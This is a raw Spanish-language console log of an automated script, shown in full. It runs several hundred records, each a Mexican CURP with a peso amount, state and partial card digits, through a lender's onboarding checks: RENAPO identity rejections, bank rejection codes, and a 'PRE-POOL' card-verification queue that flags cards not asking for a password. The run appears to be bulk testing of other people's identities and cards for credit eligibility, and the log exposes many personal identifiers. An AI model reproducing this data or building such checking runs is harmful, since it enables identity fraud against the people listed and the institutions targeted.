[590] ID:3566079 | PESJ770806HYCRSR01 | $198,560 | YUCATAN | T:1272... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[591] ID:3075209 | HULA690903HYNCPR07 | $198,490 | YUCATAN | T:2980... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1823 para ID:221964 ($198,570)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.3s)
[592] ID:1607196 | CUPR750505HDFRRC03 | $198,450 | CIUDAD DE ME | T:8683... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[593] ID:1889204 | NAKA730426HVRVLL06 | $198,450 | VERACRUZ | T:4222... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[594] ID:3881890 | RACT741023MMCHRR02 | $198,450 | ESTADO DE ME | T:0116... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[595] ID:4789558 | MANN740729HQRRVX00 | $198,450 | QUINTANA ROO | T:3643... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.2s)
[596] ID:2906920 | BORB720303MDFNVL07 | $198,440 | CIUDAD DE ME | T:4655... [🔴 OFF] Rechazo bancario (PE1002) (13.2s)
[597] ID:2960177 | AUSM710817HMCGNG05 | $198,440 | ESTADO DE ME | T:4502... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[598] ID:4754590 | VIVA000101HTSLLMA1 | $198,420 | TAMAULIPAS | T:0550... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[599] ID:4323177 | AACH690811HTSPRC07 | $198,380 | TAMAULIPAS | T:8235... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[600] ID:4100044 | GAMA720311HNTRDR01 | $198,370 | NAYARIT | T:3393... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[601] ID:2906261 | HULA690903HYNCPR07 | $198,360 | YUCATAN | T:6434... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.4s)
[602] ID:2148020 | AECR760306HGTRBB02 | $198,330 | GUANAJUATO | T:2103... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8235 para ID:4323177 ($198,380)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[603] ID:2418582 | GOBM700929HDFNNG01 | $198,300 | CIUDAD DE ME | T:7979... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.8s)
[604] ID:3907166 | GAER731013HMCLSD00 | $198,180 | ESTADO DE ME | T:4104... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[605] ID:2632038 | IILV750205HDFRMC03 | $198,150 | CIUDAD DE ME | T:4897... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[606] ID:1579408 | GOLF730409HTSRDR08 | $198,120 | TAMAULIPAS | T:0638... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[607] ID:2917299 | RAVL710820HJCMLS08 | $198,090 | JALISCO | T:4732... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[608] ID:56852 | DIIO700327HBSZSS03 | $198,000 | BAJA CALIFOR | T:5993... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[609] ID:344711 | PALR731111MVRRPS08 | $198,000 | VERACRUZ | T:4403... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[610] ID:533370 | AEHJ690323HASRRN03 | $198,000 | AGUASCALIENT | T:3891... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[611] ID:1084744 | ROGJ771225HGTDRS00 | $198,000 | GUANAJUATO | T:4791... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[612] ID:1281344 | VABE700412MMNLLM05 | $198,000 | MICHOACAN | T:5678... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[613] ID:1336249 | OUZG731103HJCRML08 | $198,000 | JALISCO | T:5938... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[614] ID:1422551 | PAZA811101MSORMN03 | $198,000 | SINALOA | T:8415... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[615] ID:1602647 | ROGJ720305MJCBRC04 | $198,000 | JALISCO | T:0028... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[616] ID:1675997 | REAZ710814MTSYLL01 | $198,000 | REYNOSA | T:9376... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.4s)
[617] ID:1745797 | RULO841101HNTBVM06 | $198,000 | NAYARIT | T:4503... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0028 para ID:1602647 ($198,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[618] ID:1819004 | PALV750516MJCRLR05 | $198,000 | JALISCO | T:8407... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9376 para ID:1675997 ($198,000)... [619] ID:1896579 | MOOJ741110HMCNRR08 | $198,000 | ESTADO DE ME | T:0942... [🔴 OFF] Rechazo bancario (PE170) (13.1s)
[620] ID:2125775 | OOPE740115HDGRRN09 | $198,000 | DURANGO | T:2316... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[621] ID:2180555 | RUEN010101HMCSLNA7 | $198,000 | ESTADO DE ME | T:1017... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[622] ID:2297156 | EOSR740129MCSSNC00 | $198,000 | CHIAPAS | T:8798... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8407 para ID:1819004 ($198,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.4s)
[623] ID:2334372 | OESM700616HPLRNR00 | $198,000 | PUEBLA | T:1847... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE110) (16.1s)
[624] ID:2460911 | AAGG000101HDFLRNA1 | $198,000 | CIUDAD DE ME | T:3966... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.5s)
[625] ID:2587452 | GAHI771129MCHRRS06 | $198,000 | CHIHUAHUA | T:8526... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[626] ID:2735877 | ROMJ751226HDGSRR09 | $198,000 | DURANGO | T:7228... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[627] ID:2856096 | CALM690315MMCHPN09 | $198,000 | ESTADO DE ME | T:3568... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[628] ID:2893831 | GAGH720516HBSRLR03 | $198,000 | BAJA CALIFOR | T:3596... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.4s)
[629] ID:2927291 | MALE710720HOCTPL00 | $198,000 | OAXACA | T:7414... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8526 para ID:2587452 ($198,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[630] ID:2992442 | FAJC730221MQRRMR03 | $198,000 | QUINTANA ROO | T:0813... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.8s)
[631] ID:3094555 | UOAM721027MCGLCR05 | $198,000 | COAHUILA | T:4883... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (17.0s)
[632] ID:3540823 | CALI720901HSONNV04 | $198,000 | SINALOA | T:4091... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[633] ID:3557467 | BOTA701107HCHRRR05 | $198,000 | CHIHUAHUA | T:7717... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[634] ID:3695047 | AIOL761112HDFVCS00 | $198,000 | CIUDAD DE ME | T:7664... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[635] ID:4141574 | RASC740418MTSMNL01 | $198,000 | TAMAULIPAS | T:6888... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[636] ID:4257004 | PAFL711026MDFNLC08 | $198,000 | CIUDAD DE ME | T:5883... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.3s)
[637] ID:4455890 | LIML711127MCGNLY02 | $198,000 | COAHUILA | T:6695... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[638] ID:4584300 | VEAJ710621HBSLNS04 | $198,000 | BAJA CALIFOR | T:5773... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[639] ID:4647563 | FOVJ710521HNLLZN02 | $198,000 | NUEVO LEON | T:0184... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.7s)
[640] ID:4695574 | TOTL740701HASRRS05 | $198,000 | AGUASCALIENT | T:3322... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[641] ID:4800676 | OOBM731014HTCRNR00 | $198,000 | TABASCO | T:7067... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[642] ID:2218551 | MADC800907HNLDLR06 | $197,960 | NUEVO LEON | T:3141... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0184 para ID:4647563 ($198,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.6s)
[643] ID:2577972 | DEGC000101HNLLRRA8 | $197,920 | NUEVO LEON | T:0927... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3141 para ID:2218551 ($197,960)... [🔴 OFF] Rechazo bancario (PE170) (18.2s)
[644] ID:1302566 | BAFS771225HJCRNL03 | $197,830 | JALISCO | T:2072... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[645] ID:788334 | HEDA761023HDFRZN03 | $197,800 | CIUDAD DE ME | T:3673... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.8s)
[646] ID:2958373 | AINA750505HGTTRL00 | $197,650 | GUANAJUATO | T:7706... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.1s)
[647] ID:260198 | MOTM711110HVRRRG07 | $197,640 | VERACRUZ | T:6415... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[648] ID:2724754 | VAMB700430MTSRTL02 | $197,600 | TAMAULIPAS | T:2740... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)
[649] ID:4396544 | LEGR720105HNLLJL01 | $197,600 | NUEVO LEON | T:5157... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7706 para ID:2958373 ($197,650)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.1s)
[650] ID:2996466 | CASC691015HCMBTS08 | $197,580 | COLIMA | T:7403... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[651] ID:1693282 | BARC710218MNLRDL01 | $197,560 | NUEVO LEON | T:3259... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2740 para ID:2724754 ($197,600)... [652] ID:672418 | VAMG710530HGRRLR02 | $197,500 | GUERRERO | T:5349... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.7s)
[653] ID:1968076 | CORO760801HQTLDS04 | $197,490 | QUERETARO | T:9586... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[654] ID:3525706 | MOTM000101HDFRRNA1 | $197,490 | CIUDAD DE ME | T:1925... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.1s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5157 para ID:4396544 ($197,600)... [655] ID:114364 | COSP710226HJCVND06 | $197,470 | JALISCO | T:0848... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[656] ID:2755252 | CARL690603MDFRVL09 | $197,410 | CIUDAD DE ME | T:6615... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7403 para ID:2996466 ($197,580)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.9s)
[657] ID:3385302 | LEGR720105HNLLJL01 | $197,370 | NUEVO LEON | T:6507... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[658] ID:3522069 | RUFR010101HDFDRRA8 | $197,310 | CIUDAD DE ME | T:6669... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9586 para ID:1968076 ($197,490)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.0s)
[659] ID:3912610 | AEMK720615MMNRRR01 | $197,300 | MICHOACAN | T:2738... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[660] ID:3335403 | PICI720331HYCRRS06 | $197,260 | YUCATAN | T:5933... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[661] ID:3565635 | VACJ710807HDFLRN02 | $197,260 | CIUDAD DE ME | T:3990... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6615 para ID:2755252 ($197,410)... [🔴 OFF] Rechazo bancario (PE110) (16.5s)
[662] ID:1735458 | MEGA700130HHGDNR09 | $197,220 | HIDALGO | T:7556... [🔴 OFF] Rechazo bancario (PE020) (14.2s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[663] ID:2342706 | CAGR750913HNLNRB06 | $197,220 | NUEVO LEON | T:1097... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6507 para ID:3385302 ($197,370)... [🔴 OFF] Rechazo bancario (PE021) (10.5s)
[664] ID:4257816 | GAMA710618HSORNR06 | $197,220 | SINALOA | T:6281... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[665] ID:1998010 | SAGP710806HTSNRD03 | $197,160 | TAMAULIPAS | T:5089... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.7s)
[666] ID:121327 | CEAG731228MVRDVD03 | $197,080 | VERACRUZ | T:2174... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1097 para ID:2342706 ($197,220)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[667] ID:1047251 | GASL690913MDFRLR01 | $197,030 | CIUDAD DE ME | T:9639... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.4s)
[668] ID:1132741 | AAGN691106HJCLRX01 | $197,010 | JALISCO | T:1480... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[669] ID:78746 | GAVC700910HJCRLS01 | $197,000 | JALISCO | T:6513... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.2s)
[670] ID:565354 | GOHC711208MBCMRN02 | $197,000 | BAJA CALIFOR | T:2615... [🔴 OFF] Rechazo bancario (PE170) (12.9s)
[671] ID:716639 | ROMF750902HGTDRL06 | $197,000 | GUANAJUATO | T:9548... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[672] ID:1138693 | HEAA820515HJCRNL02 | $197,000 | JALISCO | T:1460... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2615 para ID:565354 ($197,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.3s)
[673] ID:1401453 | ROTI710222MGTSRR01 | $197,000 | GUANAJUATO | T:5766... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[674] ID:1413939 | GUGF731215HCGRTR08 | $197,000 | COAHUILA | T:8437... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.4s)
[675] ID:1519041 | GUCC720828HCMRRR01 | $197,000 | COLIMA | T:7984... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9548 para ID:716639 ($197,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[676] ID:1713664 | SACF770924HNLLVB08 | $197,000 | NUEVO LEON | T:4436... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.1s)
[677] ID:1752866 | PATO760610HJCRLS03 | $197,000 | JALISCO | T:1859... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1460 para ID:1138693 ($197,000)... [678] ID:1788627 | CARR720426HTCNSD06 | $197,000 | TABASCO | T:5843... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.8s)
[679] ID:3428209 | CACX690419HDFRML08 | $197,000 | CIUDAD DE ME | T:9812... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[680] ID:3545312 | CAVG700613HMNZLS02 | $197,000 | MICHOACAN | T:4495... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[681] ID:4214340 | TECR731029HCHNRD02 | $197,000 | CHIHUAHUA | T:8224... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.7s)
[682] ID:4390933 | GAIC711124HJCRNR07 | $197,000 | JALISCO | T:8780... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4436 para ID:1713664 ($197,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[683] ID:848545 | PEFE010101HMCRRRA3 | $196,990 | ESTADO DE ME | T:7524... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[684] ID:3036100 | BAPF730810HVRRNR02 | $196,990 | VERACRUZ | T:3763... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[685] ID:4824052 | CARR740228HDFHJM08 | $196,950 | CIUDAD DE ME | T:9236... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[686] ID:49647 | GABJ690907HSPLZN05 | $196,930 | SAN LUIS POT | T:6841... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (20.0s)
[687] ID:3871878 | HERA740816HDFRSN04 | $196,910 | CIUDAD DE ME | T:9103... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (19.5s)
[688] ID:3298977 | AUUH690320HBCGRC05 | $196,870 | BAJA CALIFOR | T:9048... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[689] ID:3457402 | BAPF730810HVRRNR02 | $196,860 | VERACRUZ | T:8204... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[690] ID:256340 | AUMJ710603HTSLNM09 | $196,810 | TAMAULIPAS | T:3481... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9103 para ID:3871878 ($196,910)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[691] ID:183383 | AUMM720217HDFNRG00 | $196,790 | CIUDAD DE ME | T:1954... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.2s)
[692] ID:1659153 | MORD710917MTSRMN06 | $196,780 | TAMAULIPAS | T:8467... [🔴 OFF] Contacto preexistente (/confirm-contact) (20.3s)
[693] ID:1925487 | LOMR701007HCGMRL01 | $196,660 | COAHUILA | T:8734... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[694] ID:182447 | CAME770228MNLNNL06 | $196,620 | NUEVO LEON | T:8584... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[695] ID:1056549 | PILL711227HDFNPS04 | $196,560 | CIUDAD DE ME | T:0664... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[696] ID:2993882 | MAPJ690410HMCRRN05 | $196,560 | ESTADO DE ME | T:0003... [697] ID:3955432 | SACU700407HOCNNL03 | $196,560 | OAXACA | T:2325... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[698] ID:3174904 | AAEL010101MSOMLLA2 | $196,540 | SINALOA | T:4326... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[699] ID:4754375 | PAGR690830MSOZNS09 | $196,530 | SINALOA | T:9028... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2325 para ID:3955432 ($196,560)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.4s)
[700] ID:1578651 | AUMM700227HGTGNR04 | $196,500 | GUANAJUATO | T:6738... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[701] ID:3346254 | RAHA770613HGTYRN08 | $196,500 | GUANAJUATO | T:1726... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[702] ID:4657193 | GAGM720220HTSRNG00 | $196,500 | TAMAULIPAS | T:3564... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.8s)
[703] ID:3525970 | AIBC710701HYCBDH00 | $196,460 | YUCATAN | T:0379... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)
[704] ID:3828084 | LEME701012HNLSRD05 | $196,420 | NUEVO LEON | T:6999... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1726 para ID:3346254 ($196,500)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[705] ID:4147387 | BAAJ750401HSORCM08 | $196,420 | SINALOA | T:6668... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.9s)
[706] ID:3585764 | BAMJ691204HDFRRS08 | $196,400 | CIUDAD DE ME | T:1318... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[707] ID:227514 | TEAE691012HDFRLD01 | $196,390 | CIUDAD DE ME | T:3067... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[708] ID:1301684 | ROAI740512HVRDGS04 | $196,350 | VERACRUZ | T:8684... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[709] ID:4179418 | NUHM710425HDFNRR09 | $196,350 | CIUDAD DE ME | T:3608... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[710] ID:805259 | POJO010101HSOMPQA1 | $196,330 | SONORA | T:9190... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.5s)
[711] ID:4510445 | GARD751003HPLRZN00 | $196,320 | PUEBLA | T:8137... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.0s)
[712] ID:2609517 | QURL720113HDGNMS09 | $196,250 | DURANGO | T:1342... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.9s)
[713] ID:1088254 | MITJ761029HDFGRN06 | $196,210 | CIUDAD DE ME | T:7727... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[714] ID:2226020 | LATM711218MDFGRG08 | $196,150 | CIUDAD DE ME | T:2447... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[715] ID:1658184 | PEGL700320HNLRRN08 | $196,120 | NUEVO LEON | T:4153... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[716] ID:1919071 | SIPM820608MOCPRR01 | $196,100 | OAXACA | T:6911... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.6s)
[717] ID:193692 | GOCJ700925HMCNVS06 | $196,090 | ESTADO DE ME | T:0635... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[718] ID:4810221 | RORL720610MYCSZZ08 | $196,090 | YUCATAN | T:6981... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.8s)
[719] ID:2499673 | RAGL720128HJCMNS08 | $196,080 | JALISCO | T:4843... [720] ID:1954057 | CAPE710213HMCSSR01 | $196,020 | ESTADO DE ME | T:1010... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6911 para ID:1919071 ($196,100)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[721] ID:547559 | FOCF730218HQRLNL04 | $196,000 | QUINTANA ROO | T:5498... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[722] ID:717785 | LOSF720815HCGPLR07 | $196,000 | COAHUILA | T:5731... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.1s)
[723] ID:811402 | MEMC730109HNLNRR01 | $196,000 | NUEVO LEON | T:3577... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.0s)
[724] ID:1136542 | CUGR730805HVRRRB08 | $196,000 | VERACRUZ | T:4065... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[725] ID:1254733 | ZAMC700430MMNVDR04 | $196,000 | MICHOACAN | T:8291... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.5s)
[726] ID:1757323 | RUBN800513HGTZRS07 | $196,000 | GUANAJUATO | T:6330... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[727] ID:1981855 | SAPA781115HDFLLR02 | $196,000 | CIUDAD DE ME | T:8210... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8291 para ID:1254733 ($196,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.1s)
[728] ID:2828799 | MAAJ740815HDFRRL04 | $196,000 | CIUDAD DE ME | T:9530... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[729] ID:2947036 | MEFP710614MMCDRL01 | $196,000 | ESTADO DE ME | T:3462... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[730] ID:3471656 | SAAJ730909HMCLBN06 | $196,000 | ESTADO DE ME | T:6028... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6330 para ID:1757323 ($196,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[731] ID:3607276 | SARC710824HCGLDR08 | $196,000 | COAHUILA | T:9052... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[732] ID:3777993 | CAGH781226HNLBRC07 | $196,000 | NUEVO LEON | T:1626... [🔴 OFF] Contacto preexistente (/confirm-contact) (21.4s)
[733] ID:3881244 | GOCR690704HSONRF00 | $196,000 | SINALOA | T:6992... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[734] ID:4348878 | RADA690114HDFZGD00 | $196,000 | CIUDAD DE ME | T:4837... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)
[735] ID:4464609 | SARJ761207HVRNVQ00 | $196,000 | VERACRUZ | T:9430... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1626 para ID:3777993 ($196,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
